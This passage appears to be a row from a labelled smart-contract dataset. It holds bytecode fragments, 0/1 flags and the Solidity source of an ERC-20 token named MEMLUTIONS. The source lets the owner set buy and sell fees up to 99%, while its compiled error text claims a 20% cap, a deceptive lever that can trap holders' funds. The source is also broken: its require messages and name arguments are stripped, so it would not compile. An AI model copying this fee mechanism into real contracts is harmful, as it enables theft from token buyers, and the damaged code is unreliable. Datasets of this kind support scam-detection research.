5550505050505050565b6001600160a01b03821660009081526007602052604081205460ff1680611ae757506001600160a01b03821660009081526007602052604090205460ff165b15611af45750600061084c565b50600161084c565b600080611b1f600e5461177b600c54600d54611b189190612211565b8690611c5b565b90506000611b3e600e5461177b600c5487611c5b90919063ffffffff16565b30600090815260056020526040902054909150611b5b908361161d565b30600081815260056020526040908190209290925590516001600160a01b0387169060008051602061226a83398151915290611b9a9086815260200190565b60405180910390a361dead60005260056020527f7d509c07f0d4edcc2dd1b53aae68677132eb562dcba78e36381b63ccaf66e6ba54611bd9908261161d565b61dead600081905260056020527f7d509c07f0d4edcc2dd1b53aae68677132eb562dcba78e36381b63ccaf66e6ba919091556040516001600160a01b0387169060008051602061226a83398151915290611c369085815260200190565b60405180910390a3611c52611c4b828461215a565b8590611c73565b95945050505050565b600061090f8284612228565b600061090f8284612247565b600061090f8284612211565b600060208083528351808285015260005b81811015611cac57858101830151858201604001528201611c90565b81811115611cbe576000604083870101525b50601f01601f1916929092016040019392505050565b6001600160a01b0381168114611ce957600080fd5b50565b60008060408385031215611cff57600080fd5b8235611d0a81611cd4565b946020939093013593505050565b600080600060608486031215611d2d57600080fd5b8335611d3881611cd4565b92506020840135611d4881611cd4565b929592945050506040919091013590565b60008060408385031215611d6c57600080fd5b50508035926020909101359150565b600060208284031215611d8d57600080fd5b813561090f81611cd4565b8015158114611ce957600080fd5b60008060408385031215611db957600080fd5b8235611dc481611cd4565b91506020830135611dd481611d98565b809150509250929050565b600080600060408486031215611df457600080fd5b833567ffffffffffffffff80821115611e0c57600080fd5b818601915086601f830112611e2057600080fd5b813581811115611e2f57600080fd5b8760208260051b8501011115611e4457600080fd5b60209283019550935050840135611e5a81611d98565b809150509250925092565b60008060008060808587031215611e7b57600080fd5b5050823594602084013594506040840135936060013592509050565b600060208284031215611ea957600080fd5b5035919050565b634e487b7160e01b600052604160045260246000fd5b604051601f8201601f1916810167ffffffffffffffff81118282101715611eef57611eef611eb0565b604052919050565b600067ffffffffffffffff821115611f1157611f11611eb0565b5060051b60200190565b600082601f830112611f2c57600080fd5b81356020611f41611f3c83611ef7565b611ec6565b82815260059290921b84018101918181019086841115611f6057600080fd5b8286015b84811015611f7b5780358352918301918301611f64565b509695505050505050565b60008060408385031215611f9957600080fd5b823567ffffffffffffffff80821115611fb157600080fd5b818501915085601f830112611fc557600080fd5b81356020611fd5611f3c83611ef7565b82815260059290921b84018101918181019089841115611ff457600080fd5b948201945b8386101561201b57853561200c81611cd4565b82529482019490820190611ff9565b9650508601359250508082111561203157600080fd5b5061203e85828601611f1b565b9150509250929050565b6000806040838503121561205b57600080fd5b823561206681611cd4565b91506020830135611dd481611cd4565b6000806040838503121561208957600080fd5b8235611d0a81611d98565b6020808252600e908201526d139bdd08185d5d1a1bdc9a5e995960921b604082015260600190565b6000602082840312156120ce57600080fd5b5051919050565b6000602082840312156120e757600080fd5b815161090f81611d98565b634e487b7160e01b600052603260045260246000fd5b634e487b7160e01b600052601160045260246000fd5b60006001820161213057612130612108565b5060010190565b6020808252600990820152682737ba1037bbb732b960b91b604082015260600190565b6000821982111561216d5761216d612108565b500190565b600060a082018783526020878185015260a0604085015281875180845260c086019150828901935060005b818110156121c25784516001600160a01b03168352938301939183019160010161219d565b50506001600160a01b03969096166060850152505050608001529392505050565b6000806000606084860312156121f857600080fd5b8351925060208401519150604084015190509250925092565b60008282101561222357612223612108565b500390565b600081600019048311821515161561224257612242612108565b500290565b60008261226457634e487b7160e01b600052601260045260246000fd5b50049056feddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3efa264697066735822122097c240b7cc7ba84e4e9fc544e5527d3e33df62fb4013bb4b4d1e09a31536452364736f6c634300080f0033,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0
"pragma solidity =0.8.16;pragma experimental ABIEncoderV2;abstract contract Context { function _msgSender() internal view virtual returns (address) { return msg.sender; } function _msgData() internal view virtual returns (bytes calldata) { return msg.data; }}abstract contract Ownable is Context { address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); constructor() { _transferOwnership(_msgSender()); } function owner() public view virtual returns (address) { return _owner; } modifier onlyOwner() { require(owner() == _msgSender(), ); _; } function renounceOwnership() public virtual onlyOwner { _transferOwnership(address(0)); } function transferOwnership(address newOwner) public virtual onlyOwner { require(newOwner != address(0), ); _transferOwnership(newOwner); } function _transferOwnership(address newOwner) internal virtual { address oldOwner = _owner; _owner = newOwner; emit OwnershipTransferred(oldOwner, newOwner); }}interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value);}interface IERC20Metadata is IERC20 { function name() external view returns (string memory); function symbol() external view returns (string memory); function decimals() external view returns (uint8);}contract ERC20 is Context, IERC20, IERC20Metadata { mapping(address => uint256) private _balances; mapping(address => mapping(address => uint256)) private _allowances; uint256 private _totalSupply; string private _name; string private _symbol; constructor(string memory name_, string memory symbol_) { _name = name_; _symbol = symbol_; } function name() public view virtual override returns (string memory) { return _name; } function symbol() public view virtual override returns (string memory) { return _symbol; } function decimals() public view virtual override returns (uint8) { return 18; } function totalSupply() public view virtual override returns (uint256) { return _totalSupply; } function balanceOf(address account) public view virtual override returns (uint256) { return _balances[account]; } function transfer(address recipient, uint256 amount) public virtual override returns (bool) { _transfer(_msgSender(), recipient, amount); return true; } function allowance(address owner, address spender) public view virtual override returns (uint256) { return _allowances[owner][spender]; } function approve(address spender, uint256 amount) public virtual override returns (bool) { _approve(_msgSender(), spender, amount); return true; } function transferFrom( address sender, address recipient, uint256 amount ) public virtual override returns (bool) { _transfer(sender, recipient, amount); uint256 currentAllowance = _allowances[sender][_msgSender()]; require(currentAllowance >= amount, ); unchecked { _approve(sender, _msgSender(), currentAllowance - amount); } return true; } function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue); return true; } function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) { uint256 currentAllowance = _allowances[_msgSender()][spender]; require(currentAllowance >= subtractedValue, ); unchecked { _approve(_msgSender(), spender, currentAllowance - subtractedValue); } return true; } function _transfer( address sender, address recipient, uint256 amount ) internal virtual { require(sender != address(0), ); require(recipient != address(0), ); _beforeTokenTransfer(sender, recipient, amount); uint256 senderBalance = _balances[sender]; require(senderBalance >= amount, ); unchecked { _balances[sender] = senderBalance - amount; } _balances[recipient] += amount; emit Transfer(sender, recipient, amount); _afterTokenTransfer(sender, recipient, amount); } function _mint(address account, uint256 amount) internal virtual { require(account != address(0), ); _beforeTokenTransfer(address(0), account, amount); _totalSupply += amount; _balances[account] += amount; emit Transfer(address(0), account, amount); _afterTokenTransfer(address(0), account, amount); } function _approve( address owner, address spender, uint256 amount ) internal virtual { require(owner != address(0), ); require(spender != address(0), ); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); } function _beforeTokenTransfer( address from, address to, uint256 amount ) internal virtual {} function _afterTokenTransfer( address from, address to, uint256 amount ) internal virtual {}}library SafeMath { function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) { unchecked { uint256 c = a + b; if (c < a) return (false, 0); return (true, c); } } function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) { unchecked { if (b > a) return (false, 0); return (true, a - b); } } function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) { unchecked { if (a == 0) return (true, 0); uint256 c = a * b; if (c / a != b) return (false, 0); return (true, c); } } function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) { unchecked { if (b == 0) return (false, 0); return (true, a / b); } } function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) { unchecked { if (b == 0) return (false, 0); return (true, a % b); } } function add(uint256 a, uint256 b) internal pure returns (uint256) { return a + b; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { return a - b; } function mul(uint256 a, uint256 b) internal pure returns (uint256) { return a * b; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return a / b; } function mod(uint256 a, uint256 b) internal pure returns (uint256) { return a % b; } function sub( uint256 a, uint256 b, string memory errorMessage ) internal pure returns (uint256) { unchecked { require(b <= a, errorMessage); return a - b; } } function div( uint256 a, uint256 b, string memory errorMessage ) internal pure returns (uint256) { unchecked { require(b > 0, errorMessage); return a / b; } } function mod( uint256 a, uint256 b, string memory errorMessage ) internal pure returns (uint256) { unchecked { require(b > 0, errorMessage); return a % b; } }}interface IUniswapV2Factory { event PairCreated( address indexed token0, address indexed token1, address pair, uint256 ); function feeTo() external view returns (address); function feeToSetter() external view returns (address); function getPair(address tokenA, address tokenB) external view returns (address pair); function allPairs(uint256) external view returns (address pair); function allPairsLength() external view returns (uint256); function createPair(address tokenA, address tokenB) external returns (address pair); function setFeeTo(address) external; function setFeeToSetter(address) external;}interface IUniswapV2Pair { event Approval( address indexed owner, address indexed spender, uint256 value ); event Transfer(address indexed from, address indexed to, uint256 value); function name() external pure returns (string memory); function symbol() external pure returns (string memory); function decimals() external pure returns (uint8); function totalSupply() external view returns (uint256); function balanceOf(address owner) external view returns (uint256); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 value) external returns (bool); function transfer(address to, uint256 value) external returns (bool); function transferFrom( address from, address to, uint256 value ) external returns (bool); function DOMAIN_SEPARATOR() external view returns (bytes32); function PERMIT_TYPEHASH() external pure returns (bytes32); function nonces(address owner) external view returns (uint256); function permit( address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s ) external; event Mint(address indexed sender, uint256 amount0, uint256 amount1); event Swap( address indexed sender, uint256 amount0In, uint256 amount1In, uint256 amount0Out, uint256 amount1Out, address indexed to ); event Sync(uint112 reserve0, uint112 reserve1); function MINIMUM_LIQUIDITY() external pure returns (uint256); function factory() external view returns (address); function token0() external view returns (address); function token1() external view returns (address); function getReserves() external view returns ( uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast ); function price0CumulativeLast() external view returns (uint256); function price1CumulativeLast() external view returns (uint256); function kLast() external view returns (uint256); function mint(address to) external returns (uint256 liquidity); function swap( uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data ) external; function skim(address to) external; function sync() external; function initialize(address, address) external;}interface IUniswapV2Router02 { function factory() external pure returns (address); function WETH() external pure returns (address); function addLiquidity( address tokenA, address tokenB, uint256 amountADesired, uint256 amountBDesired, uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline ) external returns ( uint256 amountA, uint256 amountB, uint256 liquidity ); function addLiquidityETH( address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline ) external payable returns ( uint256 amountToken, uint256 amountETH, uint256 liquidity ); function swapExactTokensForTokensSupportingFeeOnTransferTokens( uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external; function swapExactETHForTokensSupportingFeeOnTransferTokens( uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external payable; function swapExactTokensForETHSupportingFeeOnTransferTokens( uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external;}contract MEMLUTIONS is ERC20, Ownable { using SafeMath for uint256; IUniswapV2Router02 public immutable uniswapV2Router; address public immutable uniswapV2Pair; address public constant deadAddress = address(0xdead); bool private swapping; address public marketingWallet; uint256 public maxTransactionAmount; uint256 public swapTokensAtAmount; uint256 public maxWallet; bool public tradingActive = false; bool public swapEnabled = false; uint256 public buyTotalFees; uint256 private buyMarketingFee; uint256 private buyLiquidityFee; uint256 public sellTotalFees; uint256 private sellMarketingFee; uint256 private sellLiquidityFee; uint256 private tokensForMarketing; uint256 private tokensForLiquidity; uint256 private previousFee; mapping(address => bool) private _isExcludedFromFees; mapping(address => bool) private _isExcludedMaxTransactionAmount; mapping(address => bool) private automatedMarketMakerPairs; event UpdateUniswapV2Router( address indexed newAddress, address indexed oldAddress ); event ExcludeFromFees(address indexed account, bool isExcluded); event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value); event marketingWalletUpdated( address indexed newWallet, address indexed oldWallet ); event SwapAndLiquify( uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiquidity ); constructor() ERC20(, ) { IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02( 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D ); excludeFromMaxTransaction(address(_uniswapV2Router), true); uniswapV2Router = _uniswapV2Router; uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()) .createPair(address(this), _uniswapV2Router.WETH()); excludeFromMaxTransaction(address(uniswapV2Pair), true); _setAutomatedMarketMakerPair(address(uniswapV2Pair), true); uint256 _buyMarketingFee = 15; uint256 _buyLiquidityFee = 0; uint256 _sellMarketingFee = 15; uint256 _sellLiquidityFee = 0; uint256 totalSupply = 1000000 * 1e18; maxTransactionAmount = 20000 * 1e18; maxWallet = 20000 * 1e18; swapTokensAtAmount = (totalSupply * 5) / 10000; buyMarketingFee = _buyMarketingFee; buyLiquidityFee = _buyLiquidityFee; buyTotalFees = buyMarketingFee + buyLiquidityFee; sellMarketingFee = _sellMarketingFee; sellLiquidityFee = _sellLiquidityFee; sellTotalFees = sellMarketingFee + sellLiquidityFee; previousFee = sellTotalFees; marketingWallet = address(0x1336E5586a3c152AdA36aCC381d3733afde0A044); excludeFromFees(owner(), true); excludeFromFees(address(this), true); excludeFromFees(address(0xdead), true); excludeFromMaxTransaction(owner(), true); excludeFromMaxTransaction(address(this), true); excludeFromMaxTransaction(address(0xdead), true); _mint(msg.sender, totalSupply); } receive() external payable {} function enableTrading() external onlyOwner { tradingActive = true; swapEnabled = true; } function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner returns (bool) { require( newAmount >= (totalSupply() * 1) / 100000, ); require( newAmount <= (totalSupply() * 5) / 1000, ); swapTokensAtAmount = newAmount; return true; } function updateMaxWalletAndTxnAmount(uint256 newTxnNum, uint256 newMaxWalletNum) external onlyOwner { require( newTxnNum >= ((totalSupply() * 5) / 1000) / 1e18, ); require( newMaxWalletNum >= ((totalSupply() * 5) / 1000) / 1e18, ); maxWallet = newMaxWalletNum * (10**18); maxTransactionAmount = newTxnNum * (10**18); } function excludeFromMaxTransaction(address updAds, bool isEx) public onlyOwner { _isExcludedMaxTransactionAmount[updAds] = isEx; } function updateBuyFees( uint256 _marketingFee, uint256 _liquidityFee ) external onlyOwner { buyMarketingFee = _marketingFee; buyLiquidityFee = _liquidityFee; buyTotalFees = buyMarketingFee + buyLiquidityFee; require(buyTotalFees <= 99, ); } function updateSellFees( uint256 _marketingFee, uint256 _liquidityFee ) external onlyOwner { sellMarketingFee = _marketingFee; sellLiquidityFee = _liquidityFee; sellTotalFees = sellMarketingFee + sellLiquidityFee; previousFee = sellTotalFees; require(sellTotalFees <= 99, ); } function excludeFromFees(address account, bool excluded) public onlyOwner { _isExcludedFromFees[account] = excluded; emit ExcludeFromFees(account, excluded); } function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner { require( pair != uniswapV2Pair, ); _setAutomatedMarketMakerPair(pair, value); } function _setAutomatedMarketMakerPair(address pair, bool value) private { automatedMarketMakerPairs[pair] = value; emit SetAutomatedMarketMakerPair(pair, value); } function isExcludedFromFees(address account) public view returns (bool) { return _isExcludedFromFees[account]; } function _transfer( address from, address to, uint256 amount ) internal override { require(from != address(0), ); require(to != address(0), ); if (amount == 0) { super._transfer(from, to, 0); return; } if ( from != owner() && to != owner() && to != address(0) && to != address(0xdead) && !swapping ) { if (!tradingActive) { require( _isExcludedFromFees[from] || _isExcludedFromFees[to], ); } if ( automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to] ) { require( amount <= maxTransactionAmount, ); require( amount + balanceOf(to) <= maxWallet, ); } else if ( automatedMarketMakerPairs[to] && !_isExcludedMaxTransactionAmount[from] ) { require( amount <= maxTransactionAmount, ); } else if (!_isExcludedMaxTransactionAmount[to]) { require( amount + balanceOf(to) <= maxWallet, ); } } uint256 contractTokenBalance = balanceOf(address(this)); bool canSwap = contractTokenBalance >= swapTokensAtAmount; if ( canSwap && swapEnabled && !swapping && !automatedMarketMakerPairs[from] && !_isExcludedFromFees[from] && !_isExcludedFromFees[to] ) { swapping = true; swapBack(); swapping = false; } bool takeFee = !swapping; if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) { takeFee = false; } uint256 fees = 0; if (takeFee) { if (automatedMarketMakerPairs[to] && sellTotalFees > 0) { fees = amount.mul(sellTotalFees).div(100); tokensForLiquidity += (fees * sellLiquidityFee) / sellTotalFees; tokensForMarketing += (fees * sellMarketingFee) / sellTotalFees; } else if (automatedMarketMakerPairs[from] && buyTotalFees > 0) { fees = amount.mul(buyTotalFees).div(100); tokensForLiquidity += (fees * buyLiquidityFee) / buyTotalFees; tokensForMarketing += (fees * buyMarketingFee) / buyTotalFees; } if (fees > 0) { super._transfer(from, address(this), fees); } amount -= fees; } super._transfer(from, to, amount); sellTotalFees = previousFee; } function swapTokensForEth(uint256 tokenAmount) private { address[] memory path = new address[](2); path[0] = address(this); path[1] = uniswapV2Router.WETH(); _approve(address(this), address(uniswapV2Router), tokenAmount); uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens( tokenAmount, 0, path, address(this), block.timestamp ); } function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private { _approve(address(this), address(uniswapV2Router), tokenAmount); uniswapV2Router.addLiquidityETH{value: ethAmount}( address(this), tokenAmount, 0, 0, deadAddress, block.timestamp ); } function swapBack() private { uint256 contractBalance = balanceOf(address(this)); uint256 totalTokensToSwap = tokensForLiquidity + tokensForMarketing; bool success; if (contractBalance == 0 || totalTokensToSwap == 0) { return; } if (contractBalance > swapTokensAtAmount * 20) { contractBalance = swapTokensAtAmount * 20; } uint256 liquidityTokens = (contractBalance * tokensForLiquidity) / totalTokensToSwap / 2; uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens); uint256 initialETHBalance = address(this).balance; swapTokensForEth(amountToSwapForETH); uint256 ethBalance = address(this).balance.sub(initialETHBalance); uint256 ethForMarketing = ethBalance.mul(tokensForMarketing).div( totalTokensToSwap ); uint256 ethForLiquidity = ethBalance - ethForMarketing; tokensForLiquidity = 0; tokensForMarketing = 0; if (liquidityTokens > 0 && ethForLiquidity > 0) { addLiquidity(liquidityTokens, ethForLiquidity); emit SwapAndLiquify( amountToSwapForETH, ethForLiquidity, tokensForLiquidity ); } (success, ) = address(marketingWallet).call{value: address(this).balance}(); }}",0x6080604052600436106101fd5760003560e01c806375f0a8741161010d578063bbc0c742116100a0578063d85ba0631161006f578063d85ba063146105e8578063dd62ed3e146105fe578063e2f4560514610644578063f2fde38b1461065a578063f8b45b051461067a57600080fd5b8063bbc0c74214610578578063c024666814610592578063c8c8ebe4146105b2578063d257b34f146105c857600080fd5b806396188399116100dc57806396188399146104f85780639a7a23d614610518578063a457c2d714610538578063a9059cbb1461055857600080fd5b806375f0a874146104905780638a8c523c146104b05780638da5cb5b146104c557806395d89b41146104e357600080fd5b806339509351116101905780636a486a8e1161015f5780636a486a8e146103f05780636ddd17131461040657806370a0823114610425578063715018a61461045b5780637571336a1461047057600080fd5b8063395093511461034357806349bd5a5e146103635780634fbee1931461039757806366ca9b83146103d057600080fd5b806318160ddd116101cc57806318160ddd146102d257806323b872dd146102f157806327c8f83514610311578063313ce5671461032757600080fd5b806302dbd8f81461020957806306fdde031461022b578063095ea7b3146102565780631694505e1461028657600080fd5b3661020457005b600080fd5b34801561021557600080fd5b50610229610224366004611dd0565b610690565b005b34801561023757600080fd5b50610240610735565b60405161024d9190611df2565b60405180910390f35b34801561026257600080fd5b50610276610271366004611e55565b6107c7565b604051901515815260200161024d565b34801561029257600080fd5b506102ba7f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d81565b6040516001600160a01b03909116815260200161024d565b3480156102de57600080fd5b506002545b60405190815260200161024d565b3480156102fd57600080fd5b5061027661030c366004611e81565b6107de565b34801561031d57600080fd5b506102ba61dead81565b34801561033357600080fd5b506040516012815260200161024d565b34801561034f57600080fd5b5061027661035e366004611e55565b610888565b34801561036f57600080fd5b506102ba7f000000000000000000000000c0ff8c8f8cf8120cedc86f5942eab0f42a5f4bb781565b3480156103a357600080fd5b506102766103b2366004611ec2565b6001600160a01b031660009081526014602052604090205460ff1690565b3480156103dc57600080fd5b506102296103eb366004611dd0565b6108c4565b3480156103fc57600080fd5b506102e3600e5481565b34801561041257600080fd5b50600a5461027690610100900460ff1681565b34801561043157600080fd5b506102e3610440366004611ec2565b6001600160a01b031660009081526020819052604090205490565b34801561046757600080fd5b50610229610957565b34801561047c57600080fd5b5061022961048b366004611edf565b61098d565b34801561049c57600080fd5b506006546102ba906001600160a01b031681565b3480156104bc57600080fd5b506102296109e2565b3480156104d157600080fd5b506005546001600160a01b03166102ba565b3480156104ef57600080fd5b50610240610a1d565b34801561050457600080fd5b50610229610513366004611dd0565b610a2c565b34801561052457600080fd5b50610229610533366004611edf565b610ba0565b34801561054457600080fd5b50610276610553366004611e55565b610c7b565b34801561056457600080fd5b50610276610573366004611e55565b610d14565b34801561058457600080fd5b50600a546102769060ff1681565b34801561059e57600080fd5b506102296105ad366004611edf565b610d21565b3480156105be57600080fd5b506102e360075481565b3480156105d457600080fd5b506102766105e3366004611f1d565b610daa565b3480156105f457600080fd5b506102e3600b5481565b34801561060a57600080fd5b506102e3610619366004611f36565b6001600160a01b03918216600090815260016020908152604080832093909416825291909152205490565b34801561065057600080fd5b506102e360085481565b34801561066657600080fd5b50610229610675366004611ec2565b610efc565b34801561068657600080fd5b506102e360095481565b6005546001600160a01b031633146106c35760405162461bcd60e51b81526004016106ba90611f64565b60405180910390fd5b600f82905560108190556106d78183611faf565b600e8190556013819055606310156107315760405162461bcd60e51b815260206004820152601d60248201527f4d757374206b656570206665657320617420323025206f72206c65737300000060448201526064016106ba565b5050565b60606003805461074490611fc2565b80601f016020809104026020016040519081016040528092919081815260200182805461077090611fc2565b80156107bd5780601f10610792576101008083540402835291602001916107bd565b820191906000526020600020905b8154815290600101906020018083116107a057829003601f168201915b5050505050905090565b60006107d4338484610f97565b5060015b92915050565b60006107eb8484846110bb565b6001600160a01b0384166000908152600160209081526040808320338452909152902054828110156108705760405162461bcd60e51b815260206004820152602860248201527f45524332303a207472616e7366657220616d6f756e74206578636565647320616044820152676c6c6f77616e636560c01b60648201526084016106ba565b61087d8533858403610f97565b506001949350505050565b3360008181526001602090815260408083206001600160a01b038716845290915281205490916107d49185906108bf908690611faf565b610f97565b6005546001600160a01b031633146108ee5760405162461bcd60e51b81526004016106ba90611f64565b600c829055600d8190556109028183611faf565b600b819055606310156107315760405162461bcd60e51b815260206004820152601d60248201527f4d757374206b656570206665657320617420323025206f72206c65737300000060448201526064016106ba565b6005546001600160a01b031633146109815760405162461bcd60e51b81526004016106ba90611f64565b61098b6000611760565b565b6005546001600160a01b031633146109b75760405162461bcd60e51b81526004016106ba90611f64565b6001600160a01b03919091166000908152601560205260409020805460ff1916911515919091179055565b6005546001600160a01b03163314610a0c5760405162461bcd60e51b81526004016106ba90611f64565b600a805461ffff1916610101179055565b60606004805461074490611fc2565b6005546001600160a01b03163314610a565760405162461bcd60e51b81526004016106ba90611f64565b670de0b6b3a76400006103e8610a6b60025490565b610a76906005611ffc565b610a80919061201b565b610a8a919061201b565b821015610ae35760405162461bcd60e51b815260206004820152602160248201527f43616e6e6f7420736574206d617854786e206c6f776572207468616e20302e356044820152602560f81b60648201526084016106ba565b670de0b6b3a76400006103e8610af860025490565b610b03906005611ffc565b610b0d919061201b565b610b17919061201b565b811015610b725760405162461bcd60e51b8152602060048201526024808201527f43616e6e6f7420736574206d617857616c6c6574206c6f776572207468616e20604482015263302e352560e01b60648201526084016106ba565b610b8481670de0b6b3a7640000611ffc565b600955610b9982670de0b6b3a7640000611ffc565b6007555050565b6005546001600160a01b03163314610bca5760405162461bcd60e51b81526004016106ba90611f64565b7f000000000000000000000000c0ff8c8f8cf8120cedc86f5942eab0f42a5f4bb76001600160a01b0316826001600160a01b031603610c715760405162461bcd60e51b815260206004820152603960248201527f54686520706169722063616e6e6f742062652072656d6f7665642066726f6d2060448201527f6175746f6d617465644d61726b65744d616b657250616972730000000000000060648201526084016106ba565b61073182826117b2565b3360009081526001602090815260408083206001600160a01b038616845290915281205482811015610cfd5760405162461bcd60e51b815260206004820152602560248201527f45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77604482015264207a65726f60d81b60648201526084016106ba565b610d0a3385858403610f97565b5060019392505050565b60006107d43384846110bb565b6005546001600160a01b03163314610d4b5760405162461bcd60e51b81526004016106ba90611f64565b6001600160a01b038216600081815260146020908152604091829020805460ff191685151590811790915591519182527f9d8f7706ea1113d1a167b526eca956215946dd36cc7df39eb16180222d8b5df7910160405180910390a25050565b6005546000906001600160a01b03163314610dd75760405162461bcd60e51b81526004016106ba90611f64565b620186a0610de460025490565b610def906001611ffc565b610df9919061201b565b821015610e665760405162461bcd60e51b815260206004820152603560248201527f5377617020616d6f756e742063616e6e6f74206265206c6f776572207468616e60448201527410181718181892903a37ba30b61039bab838363c9760591b60648201526084016106ba565b6103e8610e7260025490565b610e7d906005611ffc565b610e87919061201b565b821115610ef35760405162461bcd60e51b815260206004820152603460248201527f5377617020616d6f756e742063616e6e6f742062652068696768657220746861604482015273371018171a92903a37ba30b61039bab838363c9760611b60648201526084016106ba565b50600855600190565b6005546001600160a01b03163314610f265760405162461bcd60e51b81526004016106ba90611f64565b6001600160a01b038116610f8b5760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b60648201526084016106ba565b610f9481611760565b50565b6001600160a01b038316610ff95760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b60648201526084016106ba565b6001600160a01b03821661105a5760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b60648201526084016106ba565b6001600160a01b0383811660008181526001602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b6001600160a01b0383166110e15760405162461bcd60e51b81526004016106ba9061203d565b6001600160a01b0382166111075760405162461bcd60e51b81526004016106ba90612082565b806000036111205761111b83836000611806565b505050565b6005546001600160a01b0384811691161480159061114c57506005546001600160a01b03838116911614155b801561116057506001600160a01b03821615155b801561117757506001600160a01b03821661dead14155b801561118d5750600554600160a01b900460ff16155b1561148657600a5460ff16611220576001600160a01b03831660009081526014602052604090205460ff16806111db57506001600160a01b03821660009081526014602052604090205460ff165b6112205760405162461bcd60e51b81526020600482015260166024820152752a3930b234b7339034b9903737ba1030b1ba34bb329760511b60448201526064016106ba565b6001600160a01b03831660009081526016602052604090205460ff16801561126157506001600160a01b03821660009081526015602052604090205460ff16155b15611345576007548111156112d65760405162461bcd60e51b815260206004820152603560248201527f427579207472616e7366657220616d6f756e742065786365656473207468652060448201527436b0bc2a3930b739b0b1ba34b7b720b6b7bab73a1760591b60648201526084016106ba565b6009546001600160a01b0383166000908152602081905260409020546112fc9083611faf565b11156113405760405162461bcd60e51b815260206004820152601360248201527213585e081dd85b1b195d08195e18d959591959606a1b60448201526064016106ba565b611486565b6001600160a01b03821660009081526016602052604090205460ff16801561138657506001600160a01b03831660009081526015602052604090205460ff16155b156113fc576007548111156113405760405162461bcd60e51b815260206004820152603660248201527f53656c6c207472616e7366657220616d6f756e742065786365656473207468656044820152751036b0bc2a3930b739b0b1ba34b7b720b6b7bab73a1760511b60648201526084016106ba565b6001600160a01b03821660009081526015602052604090205460ff16611486576009546001600160a01b0383166000908152602081905260409020546114429083611faf565b11156114865760405162461bcd60e51b815260206004820152601360248201527213585e081dd85b1b195d08195e18d959591959606a1b60448201526064016106ba565b30600090815260208190526040902054600854811080159081906114b15750600a54610100900460ff165b80156114c75750600554600160a01b900460ff16155b80156114ec57506001600160a01b03851660009081526016602052604090205460ff16155b801561151157506001600160a01b03851660009081526014602052604090205460ff16155b801561153657506001600160a01b03841660009081526014602052604090205460ff16155b15611564576005805460ff60a01b1916600160a01b17905561155661195b565b6005805460ff60a01b191690555b6005546001600160a01b03861660009081526014602052604090205460ff600160a01b9092048216159116806115b257506001600160a01b03851660009081526014602052604090205460ff165b156115bb575060005b60008115611746576001600160a01b03861660009081526016602052604090205460ff1680156115ed57506000600e54115b1561167b57611612606461160c600e5488611b0490919063ffffffff16565b90611b17565b9050600e54601054826116259190611ffc565b61162f919061201b565b601260008282546116409190611faf565b9091555050600e54600f546116559083611ffc565b61165f919061201b565b601160008282546116709190611faf565b909155506117289050565b6001600160a01b03871660009081526016602052604090205460ff1680156116a557506000600b54115b15611728576116c4606461160c600b5488611b0490919063ffffffff16565b9050600b54600d54826116d79190611ffc565b6116e1919061201b565b601260008282546116f29190611faf565b9091555050600b54600c546117079083611ffc565b611711919061201b565b601160008282546117229190611faf565b90915550505b801561173957611739873083611806565b61174381866120c5565b94505b611751878787611806565b5050601354600e555050505050565b600580546001600160a01b038381166001600160a01b0319831681179093556040519116919082907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e090600090a35050565b6001600160a01b038216600081815260166020526040808220805460ff191685151590811790915590519092917fffa9187bf1f18bf477bd0ea1bcbb64e93b6a98132473929edfce215cd9b16fab91a35050565b6001600160a01b03831661182c5760405162461bcd60e51b81526004016106ba9061203